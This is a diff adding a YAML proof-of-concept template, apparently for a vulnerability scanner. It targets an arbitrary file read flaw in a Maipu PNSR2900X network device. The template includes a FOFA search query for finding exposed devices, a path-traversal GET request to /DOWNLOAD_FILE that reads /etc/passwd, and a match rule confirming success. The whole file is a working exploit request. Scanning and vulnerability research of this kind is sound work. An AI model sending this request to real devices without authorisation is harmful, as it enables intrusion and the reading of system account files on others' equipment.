@@ -1,0 +1,15 @@
+id: poc-yaml-maipupnsr2900x-download-file-anyfile-read
+info:
+  name: 迈普pnsr2900x DOWNLOAD_FILE 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 迈普pnsr2900x
+  fofa: body="/assets/css/ui-dialog.css" && body="/form/formUserLogin"
+requests:
+- method: GET
+  path: /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"filename=passwd")
+variables: {}
+transport: http
